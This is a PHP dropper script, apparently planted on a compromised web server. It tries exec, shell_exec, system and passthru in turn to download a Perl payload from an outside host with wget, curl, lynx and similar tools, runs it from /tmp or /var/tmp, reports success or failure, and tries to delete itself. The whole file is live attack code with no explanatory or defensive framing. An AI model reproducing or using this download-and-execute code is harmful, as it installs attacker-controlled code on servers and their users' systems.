<?php
set_time_limit(0); 
error_reporting(0); 
if(function_exists('exec')){
if(@exec('wget http://www.un04.com//bbs/data/loco.txt -O /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@exec('curl http://www.un04.com//bbs/data/loco.txt -o /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@exec('lwp-download -a http://www.un04.com//bbs/data/loco.txt /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@exec('lynx -source http://www.un04.com//bbs/data/loco.txt > /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@exec('fetch -o http://www.un04.com//bbs/data/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@exec('GET http://www.un04.com//bbs/data/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@exec('wget http://www.un04.com//bbs/data/loco.txt -O /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@exec('curl http://www.un04.com//bbs/data/loco.txt -o /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@exec('lwp-download -a http://www.un04.com//bbs/data/loco.txt /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@exec('lynx -source http://www.un04.com//bbs/data/loco.txt > /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@exec('fetch -o /var/tmp/loco.txt http://www.un04.com//bbs/data/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@exec('GET http://www.un04.com//bbs/data/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";} else {echo "mbut!";}
}
elseif(function_exists('shell_exec')){
if(@shell_exec('wget http://www.un04.com//bbs/data/loco.txt -O /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@shell_exec('curl http://www.un04.com//bbs/data/loco.txt -o /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@shell_exec('lwp-download -a http://www.un04.com//bbs/data/loco.txt /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@shell_exec('lynx -source http://www.un04.com//bbs/data/loco.txt > /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@shell_exec('fetch -o /tmp/loco.txt http://www.un04.com//bbs/data/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@shell_exec('GET http://www.un04.com//bbs/data/loco.txt>/tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@shell_exec('wget http://www.un04.com//bbs/data/loco.txt -O /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@shell_exec('curl http://www.un04.com//bbs/data/loco.txt -o /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@shell_exec('lwp-download -a http://www.un04.com//bbs/data/loco.txt /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@shell_exec('lynx -source http://www.un04.com//bbs/data/loco.txt > /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@shell_exec('fetch -o /var/tmp/loco.txt http://www.un04.com//bbs/data/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@shell_exec('GET http://www.un04.com//bbs/data/loco.txt>/var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";} else {echo "mbut!";}
}
elseif(function_exists('system')){
if(@system('wget http://www.un04.com//bbs/data/loco.txt -O /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@system('curl http://www.un04.com//bbs/data/loco.txt -o /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@system('lwp-download -a http://www.un04.com//bbs/data/loco.txt /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@system('lynx -source http://www.un04.com//bbs/data/loco.txt > /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@system('fetch -o /tmp/loco.txt http://www.un04.com//bbs/data/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@system('GET http://www.un04.com//bbs/data/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@system('wget http://www.un04.com//bbs/data/loco.txt -O /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@system('curl http://www.un04.com//bbs/data/loco.txt -o /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@system('lwp-download -a http://www.un04.com//bbs/data/loco.txt /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@system('lynx -source http://www.un04.com//bbs/data/loco.txt > /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@system('fetch -o /var/tmp/loco.txt http://www.un04.com//bbs/data/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@system('GET http://www.un04.com//bbs/data/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";} else {echo "mbut!";}
}
elseif(function_exists('passthru')){
if(@passthru('wget http://www.un04.com//bbs/data/loco.txt -O /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@passthru('curl http://www.un04.com//bbs/data/loco.txt -o /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@passthru('lwp-download -a http://www.un04.com//bbs/data/loco.txt /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@passthru('lynx -source http://www.un04.com//bbs/data/loco.txt > /tmp/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@passthru('fetch -o /tmp/loco.txt http://www.un04.com//bbs/data/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@passthru('GET http://www.un04.com//bbs/data/loco.txt;perl /tmp/loco.txt')) { echo "jos";}
elseif(@passthru('wget http://www.un04.com//bbs/data/loco.txt -O /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@passthru('curl http://www.un04.com//bbs/data/loco.txt -o /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@passthru('lwp-download -a http://www.un04.com//bbs/data/loco.txt /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@passthru('lynx -source http://www.un04.com//bbs/data/loco.txt > /var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@passthru('fetch -o /var/tmp/loco.txt http://www.un04.com//bbs/data/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";}
elseif(@passthru('GET http://www.un04.com//bbs/data/loco.txt>/var/tmp/loco.txt;perl /var/tmp/loco.txt')) { echo "jos";} else {echo "mbut!";}
}
else {echo "mbut!";}
unlink(tmp.php);
?>
